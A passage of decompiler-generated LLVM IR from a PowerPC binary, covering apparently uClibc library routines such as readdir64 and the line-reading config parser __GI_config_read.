  store i32 %v3_1000da90, i32* %v3_1000da98, align 4
  %v0_1000da9c = load i32, i32* %r29.global-to-local, align 4
  %v1_1000da9c = add i32 %v0_1000da9c, 20
  %v2_1000da9c = inttoptr i32 %v1_1000da9c to i32*
  %v3_1000da9c = load i32, i32* %v2_1000da9c, align 4
  store i32 %v3_1000da9c, i32* %r11.global-to-local, align 4
  %v1_1000daa0 = add i32 %v0_1000da9c, 56
  %v2_1000daa0 = inttoptr i32 %v1_1000daa0 to i32*
  %v3_1000daa0 = load i32, i32* %v2_1000daa0, align 4
  store i32 %v3_1000daa0, i32* %r0.global-to-local, align 4
  %v0_1000daa4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000daa4 = load i32, i32* @r28, align 4
  %v2_1000daa4 = add i32 %v1_1000daa4, 52
  %v3_1000daa4 = inttoptr i32 %v2_1000daa4 to i32*
  store i32 %v0_1000daa4, i32* %v3_1000daa4, align 4
  %v0_1000daa8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000daa8 = load i32, i32* @r28, align 4
  %v2_1000daa8 = add i32 %v1_1000daa8, 48
  %v3_1000daa8 = inttoptr i32 %v2_1000daa8 to i32*
  store i32 %v0_1000daa8, i32* %v3_1000daa8, align 4
  %v0_1000daac = load i32, i32* %r11.global-to-local, align 4
  %v1_1000daac = load i32, i32* @r28, align 4
  %v2_1000daac = add i32 %v1_1000daac, 20
  %v3_1000daac = inttoptr i32 %v2_1000daac to i32*
  store i32 %v0_1000daac, i32* %v3_1000daac, align 4
  %v0_1000dab0 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000dab0 = add i32 %v0_1000dab0, 72
  %v2_1000dab0 = inttoptr i32 %v1_1000dab0 to i32*
  %v3_1000dab0 = load i32, i32* %v2_1000dab0, align 4
  store i32 %v3_1000dab0, i32* %r0.global-to-local, align 4
  %v1_1000dab4 = add i32 %v0_1000dab0, 76
  %v2_1000dab4 = inttoptr i32 %v1_1000dab4 to i32*
  %v3_1000dab4 = load i32, i32* %v2_1000dab4, align 4
  store i32 %v3_1000dab4, i32* %r9.global-to-local, align 4
  %v1_1000dab8 = load i32, i32* @r28, align 4
  %v2_1000dab8 = add i32 %v1_1000dab8, 56
  %v3_1000dab8 = inttoptr i32 %v2_1000dab8 to i32*
  store i32 %v3_1000dab0, i32* %v3_1000dab8, align 4
  %v0_1000dabc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000dabc = load i32, i32* @r28, align 4
  %v2_1000dabc = add i32 %v1_1000dabc, 60
  %v3_1000dabc = inttoptr i32 %v2_1000dabc to i32*
  store i32 %v0_1000dabc, i32* %v3_1000dabc, align 4
  %v0_1000dac0 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000dac0 = add i32 %v0_1000dac0, 24
  %v2_1000dac0 = inttoptr i32 %v1_1000dac0 to i32*
  %v3_1000dac0 = load i32, i32* %v2_1000dac0, align 4
  store i32 %v3_1000dac0, i32* %r9.global-to-local, align 4
  %v1_1000dac4 = add i32 %v0_1000dac0, 80
  %v2_1000dac4 = inttoptr i32 %v1_1000dac4 to i32*
  %v3_1000dac4 = load i32, i32* %v2_1000dac4, align 4
  store i32 %v3_1000dac4, i32* %r11.global-to-local, align 4
  %v1_1000dac8 = add i32 %v0_1000dac0, 84
  %v2_1000dac8 = inttoptr i32 %v1_1000dac8 to i32*
  %v3_1000dac8 = load i32, i32* %v2_1000dac8, align 4
  store i32 %v3_1000dac8, i32* %r0.global-to-local, align 4
  %v1_1000dacc = load i32, i32* @r28, align 4
  %v2_1000dacc = add i32 %v1_1000dacc, 24
  %v3_1000dacc = inttoptr i32 %v2_1000dacc to i32*
  store i32 %v3_1000dac0, i32* %v3_1000dacc, align 4
  %v0_1000dad0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000dad0 = load i32, i32* @r28, align 4
  %v2_1000dad0 = add i32 %v1_1000dad0, 68
  %v3_1000dad0 = inttoptr i32 %v2_1000dad0 to i32*
  store i32 %v0_1000dad0, i32* %v3_1000dad0, align 4
  %v0_1000dad4 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000dad4 = load i32, i32* @r28, align 4
  %v2_1000dad4 = add i32 %v1_1000dad4, 64
  %v3_1000dad4 = inttoptr i32 %v2_1000dad4 to i32*
  store i32 %v0_1000dad4, i32* %v3_1000dad4, align 4
  %v0_1000dad8 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000dad8 = add i32 %v0_1000dad8, 28
  %v2_1000dad8 = inttoptr i32 %v1_1000dad8 to i32*
  %v3_1000dad8 = load i32, i32* %v2_1000dad8, align 4
  store i32 %v3_1000dad8, i32* %r0.global-to-local, align 4
  %v1_1000dadc = add i32 %v0_1000dad8, 92
  %v2_1000dadc = inttoptr i32 %v1_1000dadc to i32*
  %v3_1000dadc = load i32, i32* %v2_1000dadc, align 4
  store i32 %v3_1000dadc, i32* %r11.global-to-local, align 4
  %v1_1000dae0 = add i32 %v0_1000dad8, 88
  %v2_1000dae0 = inttoptr i32 %v1_1000dae0 to i32*
  %v3_1000dae0 = load i32, i32* %v2_1000dae0, align 4
  store i32 %v3_1000dae0, i32* %r9.global-to-local, align 4
  %v1_1000dae4 = load i32, i32* @r28, align 4
  %v2_1000dae4 = add i32 %v1_1000dae4, 28
  %v3_1000dae4 = inttoptr i32 %v2_1000dae4 to i32*
  store i32 %v3_1000dad8, i32* %v3_1000dae4, align 4
  store i32 %v0_1000da3c, i32* %r0.global-to-local, align 4
  %v0_1000daec = load i32, i32* %r9.global-to-local, align 4
  %v1_1000daec = load i32, i32* @r28, align 4
  %v2_1000daec = add i32 %v1_1000daec, 72
  %v3_1000daec = inttoptr i32 %v2_1000daec to i32*
  store i32 %v0_1000daec, i32* %v3_1000daec, align 4
  %v0_1000daf0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000daf0 = load i32, i32* @r28, align 4
  %v2_1000daf0 = add i32 %v1_1000daf0, 76
  %v3_1000daf0 = inttoptr i32 %v2_1000daf0 to i32*
  store i32 %v0_1000daf0, i32* %v3_1000daf0, align 4
  ret i32 %v3_1000da5c

; uselistorder directives
  uselistorder i32* %r29.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7 }
  uselistorder i32 88, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %v0_1000db08 = load i32, i32* @lr, align 4
  store i32 %v0_1000db08, i32* %r0.global-to-local, align 4
  %v1_1000db14 = add i32 %tmp, 24
  store i32 %v1_1000db14, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v5_1000db2c = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 ptrtoint ([3 x i8]* @global_var_1000d02c.473 to i32), i32 %v1_1000db14)
  %v1_1000db34 = call i32 @__pthread_return_0(i32 %v1_1000db14)
  br label %dec_label_pc_1000db38

dec_label_pc_1000db38:                            ; preds = %dec_label_pc_1000db74, %entry
  %v0_1000db38 = load i32, i32* @r31, align 4
  %v1_1000db38 = add i32 %v0_1000db38, 4
  %v2_1000db38 = inttoptr i32 %v1_1000db38 to i32*
  %v3_1000db38 = load i32, i32* %v2_1000db38, align 4
  store i32 %v3_1000db38, i32* %r0.global-to-local, align 4
  %v1_1000db3c = add i32 %v0_1000db38, 8
  %v2_1000db3c = inttoptr i32 %v1_1000db3c to i32*
  %v3_1000db3c = load i32, i32* %v2_1000db3c, align 4
  store i32 %v3_1000db3c, i32* %r9.global-to-local, align 4
  %v3_1000db40 = icmp ugt i32 %v3_1000db3c, %v3_1000db38
  br i1 %v3_1000db40, label %dec_label_pc_1000db74, label %dec_label_pc_1000db48

dec_label_pc_1000db48:                            ; preds = %dec_label_pc_1000db38
  %v1_1000db48 = inttoptr i32 %v0_1000db38 to i32*
  %v2_1000db48 = load i32, i32* %v1_1000db48, align 4
  %v1_1000db4c = add i32 %v0_1000db38, 12
  %v2_1000db4c = inttoptr i32 %v1_1000db4c to i32*
  %v3_1000db4c = load i32, i32* %v2_1000db4c, align 4
  %v1_1000db50 = add i32 %v0_1000db38, 20
  %v2_1000db50 = inttoptr i32 %v1_1000db50 to i32*
  %v3_1000db50 = load i32, i32* %v2_1000db50, align 4
  %v4_1000db54 = inttoptr i32 %v3_1000db4c to i32*
  %v5_1000db54 = call i32 @__getdents64(i32 %v2_1000db48, i32* %v4_1000db54, i32 %v3_1000db50, i32 %v3_1000db3c)
  %v2_1000db58 = icmp sgt i32 %v5_1000db54, 0
  br i1 %v2_1000db58, label %dec_label_pc_1000db68, label %dec_label_pc_1000db60

dec_label_pc_1000db60:                            ; preds = %dec_label_pc_1000db48
  store i32 0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000dba4

dec_label_pc_1000db68:                            ; preds = %dec_label_pc_1000db48
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000db6c = load i32, i32* @r31, align 4
  %v2_1000db6c = add i32 %v1_1000db6c, 8
  %v3_1000db6c = inttoptr i32 %v2_1000db6c to i32*
  store i32 %v5_1000db54, i32* %v3_1000db6c, align 4
  %v0_1000db70 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000db70 = load i32, i32* @r31, align 4
  %v2_1000db70 = add i32 %v1_1000db70, 4
  %v3_1000db70 = inttoptr i32 %v2_1000db70 to i32*
  store i32 %v0_1000db70, i32* %v3_1000db70, align 4
  %v0_1000db74.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000db74

dec_label_pc_1000db74:                            ; preds = %dec_label_pc_1000db38, %dec_label_pc_1000db68
  %v1_1000db98 = phi i32 [ %v0_1000db38, %dec_label_pc_1000db38 ], [ %v0_1000db74.pre, %dec_label_pc_1000db68 ]
  %v1_1000db74 = add i32 %v1_1000db98, 4
  %v2_1000db74 = inttoptr i32 %v1_1000db74 to i32*
  %v3_1000db74 = load i32, i32* %v2_1000db74, align 4
  %v1_1000db78 = add i32 %v1_1000db98, 12
  %v2_1000db78 = inttoptr i32 %v1_1000db78 to i32*
  %v3_1000db78 = load i32, i32* %v2_1000db78, align 4
  store i32 %v3_1000db78, i32* %r9.global-to-local, align 4
  %v2_1000db7c = add i32 %v3_1000db78, %v3_1000db74
  store i32 %v2_1000db7c, i32* %r29.global-to-local, align 4
  %v3_1000db80 = inttoptr i32 %v2_1000db7c to i32*
  %v4_1000db80 = load i32, i32* %v3_1000db80, align 4
  %v1_1000db84 = add i32 %v2_1000db7c, 4
  %v2_1000db84 = inttoptr i32 %v1_1000db84 to i32*
  %v3_1000db84 = load i32, i32* %v2_1000db84, align 4
  store i32 %v3_1000db84, i32* %r9.global-to-local, align 4
  %v1_1000db88 = add i32 %v2_1000db7c, 16
  %v2_1000db88 = inttoptr i32 %v1_1000db88 to i16*
  %v3_1000db88 = load i16, i16* %v2_1000db88, align 2
  %v4_1000db88 = zext i16 %v3_1000db88 to i32
  store i32 %v4_1000db88, i32* %r0.global-to-local, align 4
  %v2_1000db8c = or i32 %v3_1000db84, %v4_1000db80
  %v5_1000db8c = icmp eq i32 %v2_1000db8c, 0
  %v1_1000db90 = add i32 %v2_1000db7c, 12
  %v2_1000db90 = inttoptr i32 %v1_1000db90 to i32*
  %v3_1000db90 = load i32, i32* %v2_1000db90, align 4
  store i32 %v3_1000db90, i32* %r9.global-to-local, align 4
  %v2_1000db94 = add i32 %v4_1000db88, %v3_1000db74
  store i32 %v2_1000db94, i32* %r0.global-to-local, align 4
  store i32 %v2_1000db94, i32* %v2_1000db74, align 4
  %v0_1000db9c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000db9c = load i32, i32* @r31, align 4
  %v2_1000db9c = add i32 %v1_1000db9c, 16
  %v3_1000db9c = inttoptr i32 %v2_1000db9c to i32*
  store i32 %v0_1000db9c, i32* %v3_1000db9c, align 4
  br i1 %v5_1000db8c, label %dec_label_pc_1000db38, label %dec_label_pc_1000dba4

dec_label_pc_1000dba4:                            ; preds = %dec_label_pc_1000db74, %dec_label_pc_1000db60
  store i32 268491696, i32* @lr, align 4
  %v3_1000dbac = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-40, i32 1)
  store i32 %v0_1000db08, i32* %r0.global-to-local, align 4
  %v0_1000dbb4 = load i32, i32* %r29.global-to-local, align 4
  ret i32 %v0_1000dbb4

; uselistorder directives
  uselistorder i32 %v2_1000db7c, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v1_1000db98, { 1, 0 }
  uselistorder i32 %v0_1000db38, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 (i32*, i32)* @_pthread_cleanup_pop_restore, { 0, 6, 4, 7, 3, 5, 1, 2 }
  uselistorder i32 (i32)* @__pthread_return_0, { 10, 3, 2, 1, 0, 5, 6, 7, 4, 9, 8 }
  uselistorder i32 (i32*, i32, i32)* @_pthread_cleanup_push_defer, { 0, 7, 5, 4, 3, 6, 1, 2 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_1000d02c.473 to i32), { 0, 1, 2, 8, 3, 4, 5, 9, 6, 7 }
  uselistorder label %dec_label_pc_1000db74, { 1, 0 }
}

define i32 @__GI_config_read(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr2_eq.global-to-local = alloca i1, align 1
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_1000dbcc = call i32 @__asm_mfcr()
  store i32 %v0_1000dbcc, i32* %r3.global-to-local, align 4
  %v0_1000dbd0 = load i32, i32* @lr, align 4
  store i32 %v0_1000dbd0, i32* %r0.global-to-local, align 4
  store i32 %v0_1000dbcc, i32* @r30, align 4
  %v3_1000dbd8 = icmp eq i32 %v0_1000dbcc, 0
  store i32 %tmp, i32* @r24, align 4
  store i32 %arg4, i32* @r28, align 4
  br i1 %v3_1000dbd8, label %dec_label_pc_1000ded8, label %dec_label_pc_1000dbf0

dec_label_pc_1000dbf0:                            ; preds = %entry
  %v1_1000dbf0 = and i32 %arg3, 1048576
  store i32 %v1_1000dbf0, i32* %r0.global-to-local, align 4
  %v1_1000dbf4 = call i32 @__asm_rlwinm(i32 %arg3, i32 15, i32 31, i32 31)
  store i32 %v1_1000dbf4, i32* %r0.global-to-local, align 4
  %v3_1000dbf8 = icmp eq i32 %v1_1000dbf4, 0
  store i1 %v3_1000dbf8, i1* %cr4_eq.global-to-local, align 1
  %v1_1000dbfc = call i32 @__asm_rlwinm(i32 %arg3, i32 14, i32 31, i32 31)
  store i32 %v1_1000dbfc, i32* %r0.global-to-local, align 4
  %v1_1000dc00 = urem i32 %arg3, 256
  store i32 %v1_1000dc00, i32* @r26, align 4
  %v3_1000dc04 = icmp eq i32 %v1_1000dbfc, 0
  store i1 %v3_1000dc04, i1* %cr2_eq.global-to-local, align 1
  %v1_1000dc08 = call i32 @__asm_rlwinm(i32 %arg3, i32 16, i32 31, i32 31)
  store i32 %v1_1000dc08, i32* %r0.global-to-local, align 4
  %v0_1000dc0c = load i32, i32* @r26, align 4
  %v1_1000dc0c = mul i32 %v0_1000dc0c, 4
  store i32 %v1_1000dc0c, i32* @r25, align 4
  %v0_1000dc10 = call i32 @__asm_mfcr()
  store i32 %v0_1000dc10, i32* %r3.global-to-local, align 4
  %v3_1000dc14 = icmp eq i32 %v1_1000dc08, 0
  store i1 %v3_1000dc14, i1* %cr3_eq.global-to-local, align 1
  %v1_1000dc18 = call i32 @__asm_rlwinm(i32 %arg3, i32 24, i32 24, i32 31)
  %v0_1000dc1c = load i32, i32* @r25, align 4
  %v1_1000dc1c = add i32 %v0_1000dc1c, 1
  store i32 %v1_1000dc1c, i32* @r22, align 4
  %v2_1000dc20 = add i32 %arg4, 1
  store i32 %v2_1000dc20, i32* @r27, align 4
  %v0_1000dc24 = load i32, i32* @r26, align 4
  %v1_1000dc24 = add i32 %v0_1000dc24, -1
  store i32 %v1_1000dc24, i32* @r23, align 4
  br label %dec_label_pc_1000dc28

dec_label_pc_1000dc28:                            ; preds = %dec_label_pc_1000ded0, %dec_label_pc_1000ddcc, %dec_label_pc_1000ddc0, %dec_label_pc_1000dbf0
  %v0_1000dc28 = load i32, i32* @r30, align 4
  %v1_1000dc28 = add i32 %v0_1000dc28, 4
  %v2_1000dc28 = inttoptr i32 %v1_1000dc28 to i32*
  %v3_1000dc28 = load i32, i32* %v2_1000dc28, align 4
  store i32 %v3_1000dc28, i32* %r0.global-to-local, align 4
  %v3_1000dc2c = icmp eq i32 %v3_1000dc28, 0
  store i1 %v3_1000dc2c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000dc2c, label %dec_label_pc_1000dc34, label %dec_label_pc_1000dc80

dec_label_pc_1000dc34:                            ; preds = %dec_label_pc_1000dc28
  %v1_1000dc34 = add i32 %v0_1000dc28, 16
  %v2_1000dc34 = inttoptr i32 %v1_1000dc34 to i32*
  %v3_1000dc34 = load i32, i32* %v2_1000dc34, align 4
  store i32 %v3_1000dc34, i32* %r0.global-to-local, align 4
  %v3_1000dc38 = icmp eq i32 %v3_1000dc34, 0
  store i1 %v3_1000dc38, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000dc38, label %dec_label_pc_1000dc40, label %dec_label_pc_1000dc48

dec_label_pc_1000dc40:                            ; preds = %dec_label_pc_1000dc34
  store i32 81, i32* %r0.global-to-local, align 4
  store i32 81, i32* %v2_1000dc34, align 4
  %v0_1000dc48.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000dc48

dec_label_pc_1000dc48:                            ; preds = %dec_label_pc_1000dc34, %dec_label_pc_1000dc40
  %v1_1000dc54 = phi i32 [ %v0_1000dc28, %dec_label_pc_1000dc34 ], [ %v0_1000dc48.pre, %dec_label_pc_1000dc40 ]
  %v1_1000dc48 = add i32 %v1_1000dc54, 8
  %v2_1000dc48 = inttoptr i32 %v1_1000dc48 to i32*
  %v3_1000dc48 = load i32, i32* %v2_1000dc48, align 4
  store i32 %v3_1000dc48, i32* %r0.global-to-local, align 4
  %v3_1000dc4c = icmp eq i32 %v3_1000dc48, 0
  store i1 %v3_1000dc4c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000dc4c, label %dec_label_pc_1000dc54, label %dec_label_pc_1000dc58

dec_label_pc_1000dc54:                            ; preds = %dec_label_pc_1000dc48
  %v0_1000dc54 = load i32, i32* @r22, align 4
  store i32 %v0_1000dc54, i32* %v2_1000dc48, align 4
  %v0_1000dc58.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000dc58

dec_label_pc_1000dc58:                            ; preds = %dec_label_pc_1000dc48, %dec_label_pc_1000dc54
  %v0_1000dc58 = phi i32 [ %v1_1000dc54, %dec_label_pc_1000dc48 ], [ %v0_1000dc58.pre, %dec_label_pc_1000dc54 ]
  %v1_1000dc58 = add i32 %v0_1000dc58, 16
  %v2_1000dc58 = inttoptr i32 %v1_1000dc58 to i32*
  %v3_1000dc58 = load i32, i32* %v2_1000dc58, align 4
  store i32 %v3_1000dc58, i32* %r0.global-to-local, align 4
  %v1_1000dc5c = add i32 %v0_1000dc58, 8
  %v2_1000dc5c = inttoptr i32 %v1_1000dc5c to i32*
  %v3_1000dc5c = load i32, i32* %v2_1000dc5c, align 4
  %v2_1000dc60 = add i32 %v3_1000dc5c, %v3_1000dc58
  store i32 %v2_1000dc60, i32* %r3.global-to-local, align 4
  store i32 268491880, i32* @lr, align 4
  %v1_1000dc64 = call i32 @malloc(i32 %v2_1000dc60)
  store i32 %v1_1000dc64, i32* %r3.global-to-local, align 4
  %v3_1000dc68 = icmp eq i32 %v1_1000dc64, 0
  store i1 %v3_1000dc68, i1* %cr7_eq.global-to-local, align 1
  %v1_1000dc6c = load i32, i32* @r30, align 4
  %v2_1000dc6c = add i32 %v1_1000dc6c, 4
  %v3_1000dc6c = inttoptr i32 %v2_1000dc6c to i32*
  store i32 %v1_1000dc64, i32* %v3_1000dc6c, align 4
  br i1 %v3_1000dc68, label %dec_label_pc_1000ded8, label %dec_label_pc_1000dc74

dec_label_pc_1000dc74:                            ; preds = %dec_label_pc_1000dc58
  %v0_1000dc74 = load i32, i32* @r30, align 4
  %v1_1000dc74 = add i32 %v0_1000dc74, 20
  %v2_1000dc74 = inttoptr i32 %v1_1000dc74 to i32*
  %v3_1000dc74 = load i32, i32* %v2_1000dc74, align 4
  %v1_1000dc78 = or i32 %v3_1000dc74, 1
  store i32 %v1_1000dc78, i32* %r0.global-to-local, align 4
  store i32 %v1_1000dc78, i32* %v2_1000dc74, align 4
  %v0_1000dc80.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000dc80

dec_label_pc_1000dc80:                            ; preds = %dec_label_pc_1000dc28, %dec_label_pc_1000dc74
  %v1_1000dc90 = phi i32 [ %v0_1000dc28, %dec_label_pc_1000dc28 ], [ %v0_1000dc80.pre, %dec_label_pc_1000dc74 ]
  %v1_1000dc80 = add i32 %v1_1000dc90, 4
  %v2_1000dc80 = inttoptr i32 %v1_1000dc80 to i32*
  %v3_1000dc80 = load i32, i32* %v2_1000dc80, align 4
  store i32 %v3_1000dc80, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  %v1_1000dc88 = add i32 %v1_1000dc90, 8
  %v2_1000dc88 = inttoptr i32 %v1_1000dc88 to i32*
  %v3_1000dc88 = load i32, i32* %v2_1000dc88, align 4
  store i32 %v3_1000dc88, i32* @r9, align 4
  %v2_1000dc8c = add i32 %v3_1000dc88, %v3_1000dc80
  store i32 %v2_1000dc8c, i32* %r0.global-to-local, align 4
  %v2_1000dc90 = add i32 %v1_1000dc90, 12
  %v3_1000dc90 = inttoptr i32 %v2_1000dc90 to i32*
  store i32 %v2_1000dc8c, i32* %v3_1000dc90, align 4
  br label %dec_label_pc_1000dc94

dec_label_pc_1000dc94:                            ; preds = %dec_label_pc_1000dd08, %dec_label_pc_1000dd1c, %dec_label_pc_1000dc80
  %v0_1000dc94 = load i32, i32* @r30, align 4
  %v1_1000dc94 = add i32 %v0_1000dc94, 12
  %v2_1000dc94 = inttoptr i32 %v1_1000dc94 to i32*
  %v3_1000dc94 = load i32, i32* %v2_1000dc94, align 4
  store i32 %v3_1000dc94, i32* %r3.global-to-local, align 4
  %v1_1000dc98 = add i32 %v0_1000dc94, 16
  %v2_1000dc98 = inttoptr i32 %v1_1000dc98 to i32*
  %v3_1000dc98 = load i32, i32* %v2_1000dc98, align 4
  store i32 %v3_1000dc98, i32* %r4.global-to-local, align 4
  %v1_1000dc9c = inttoptr i32 %v0_1000dc94 to i32*
  %v2_1000dc9c = load i32, i32* %v1_1000dc9c, align 4
  %v0_1000dca0 = load i32, i32* @r29, align 4
  %v2_1000dca0 = add i32 %v0_1000dca0, %v3_1000dc94
  store i32 %v2_1000dca0, i32* %r3.global-to-local, align 4
  %v2_1000dca4 = sub i32 %v3_1000dc98, %v0_1000dca0
  store i32 %v2_1000dca4, i32* %r4.global-to-local, align 4
  store i32 268491948, i32* @lr, align 4
  %v3_1000dca8 = call i32 @fgets(i32 %v2_1000dca0, i32 %v2_1000dca4, i32 %v2_1000dc9c)
  store i32 %v3_1000dca8, i32* %r3.global-to-local, align 4
  %v0_1000dcac = load i32, i32* @r30, align 4
  %v1_1000dcac = add i32 %v0_1000dcac, 12
  %v2_1000dcac = inttoptr i32 %v1_1000dcac to i32*
  %v3_1000dcac = load i32, i32* %v2_1000dcac, align 4
  store i32 %v3_1000dcac, i32* @r31, align 4
  %v3_1000dcb0 = icmp eq i32 %v3_1000dca8, 0
  store i1 %v3_1000dcb0, i1* %cr7_eq.global-to-local, align 1
  %v1_1000dcb4 = load i32, i32* @r29, align 4
  %v2_1000dcb4 = add i32 %v1_1000dcb4, %v3_1000dcac
  store i32 %v2_1000dcb4, i32* %r3.global-to-local, align 4
  br i1 %v3_1000dcb0, label %dec_label_pc_1000dcbc, label %dec_label_pc_1000dcd0

dec_label_pc_1000dcbc:                            ; preds = %dec_label_pc_1000dc94
  %v1_1000dcbc = add i32 %v0_1000dcac, 16
  %v2_1000dcbc = inttoptr i32 %v1_1000dcbc to i32*
  %v3_1000dcbc = load i32, i32* %v2_1000dcbc, align 4
  store i32 %v3_1000dcac, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000dccc.558 to i32), i32* @lr, align 4
  %v3_1000dcc8 = call i32 @__GI_memset(i32 %v3_1000dcac, i32 0, i32 %v3_1000dcbc)
  store i32 %v3_1000dcc8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ded8

dec_label_pc_1000dcd0:                            ; preds = %dec_label_pc_1000dc94
  %v1_1000dcd0 = inttoptr i32 %v2_1000dcb4 to i8*
  %v2_1000dcd0 = call i32 @__GI_strlen(i8* %v1_1000dcd0)
  store i32 10, i32* %r4.global-to-local, align 4
  %v0_1000dcd8 = load i32, i32* @r29, align 4
  %v2_1000dcd8 = add i32 %v0_1000dcd8, %v2_1000dcd0
  store i32 %v2_1000dcd8, i32* @r29, align 4
  %v0_1000dcdc = load i32, i32* @r31, align 4
  store i32 %v0_1000dcdc, i32* @r3, align 4
  store i32 268492004, i32* @lr, align 4
  %v2_1000dce0 = call i32 @__GI_strchr(i32 %v0_1000dcdc, i32 10)
  %v3_1000dce0 = inttoptr i32 %v2_1000dce0 to i8*
  store i32 %v2_1000dce0, i32* %r3.global-to-local, align 4
  %v4_1000dce4 = icmp eq i32 %v2_1000dce0, 0
  store i1 %v4_1000dce4, i1* @cr0_eq, align 1
  br i1 %v4_1000dce4, label %dec_label_pc_1000dd10, label %dec_label_pc_1000dcec

dec_label_pc_1000dcec:                            ; preds = %dec_label_pc_1000dcd0
  %v3_1000dcec = load i8, i8* %v3_1000dce0, align 1
  %v4_1000dcec = zext i8 %v3_1000dcec to i32
  %v0_1000dcf0 = load i32, i32* @r29, align 4
  %v1_1000dcf0 = add i32 %v0_1000dcf0, -1
  store i32 %v1_1000dcf0, i32* @r29, align 4
  %v1_1000dcf4 = add nuw nsw i32 %v4_1000dcec, 255
  %v1_1000dcf8 = urem i32 %v1_1000dcf4, 256
  store i32 %v1_1000dcf8, i32* @r9, align 4
  %v3_1000dcfc = icmp eq i32 %v1_1000dcf8, 92
  store i1 %v3_1000dcfc, i1* %cr7_eq.global-to-local, align 1
  %v1_1000dd00 = trunc i32 %v1_1000dcf4 to i8
  store i8 %v1_1000dd00, i8* %v3_1000dce0, align 1
  %v0_1000dd04 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000dd04, label %dec_label_pc_1000dd08, label %dec_label_pc_1000dda0

dec_label_pc_1000dd08:                            ; preds = %dec_label_pc_1000dcec
  %v0_1000dd08 = load i32, i32* @r29, align 4
  %v1_1000dd08 = add i32 %v0_1000dd08, -1
  store i32 %v1_1000dd08, i32* @r29, align 4
  br label %dec_label_pc_1000dc94

dec_label_pc_1000dd10:                            ; preds = %dec_label_pc_1000dcd0
  %v0_1000dd10 = load i32, i32* @r30, align 4
  %v1_1000dd10 = add i32 %v0_1000dd10, 20
  %v2_1000dd10 = inttoptr i32 %v1_1000dd10 to i32*
  %v3_1000dd10 = load i32, i32* %v2_1000dd10, align 4
  store i32 %v3_1000dd10, i32* %r0.global-to-local, align 4
  %v3_1000dd14 = icmp eq i32 %v3_1000dd10, 0
  store i1 %v3_1000dd14, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000dd14, label %dec_label_pc_1000dd4c, label %dec_label_pc_1000dd1c

dec_label_pc_1000dd1c:                            ; preds = %dec_label_pc_1000dd10
  %v1_1000dd1c = add i32 %v0_1000dd10, 16
  %v2_1000dd1c = inttoptr i32 %v1_1000dd1c to i32*
  %v3_1000dd1c = load i32, i32* %v2_1000dd1c, align 4
  store i32 %v3_1000dd1c, i32* %r4.global-to-local, align 4
  %v1_1000dd20 = add i32 %v0_1000dd10, 8
  %v2_1000dd20 = inttoptr i32 %v1_1000dd20 to i32*
  %v3_1000dd20 = load i32, i32* %v2_1000dd20, align 4
  store i32 %v3_1000dd20, i32* %r0.global-to-local, align 4
  %v1_1000dd24 = add i32 %v3_1000dd1c, 4096
  store i32 %v1_1000dd24, i32* %r4.global-to-local, align 4
  %v1_1000dd28 = add i32 %v0_1000dd10, 4
  %v2_1000dd28 = inttoptr i32 %v1_1000dd28 to i32*
  %v3_1000dd28 = load i32, i32* %v2_1000dd28, align 4
  store i32 %v3_1000dd28, i32* %r3.global-to-local, align 4
  store i32 %v1_1000dd24, i32* %v2_1000dd1c, align 4
  %v0_1000dd30 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000dd30 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000dd30 = add i32 %v1_1000dd30, %v0_1000dd30
  store i32 %v2_1000dd30, i32* %r4.global-to-local, align 4
  store i32 268492088, i32* @lr, align 4
  %v2_1000dd34 = inttoptr i32 %v3_1000dd28 to i32*
  %v3_1000dd34 = call i32 @realloc(i32* %v2_1000dd34, i32 %v2_1000dd30)
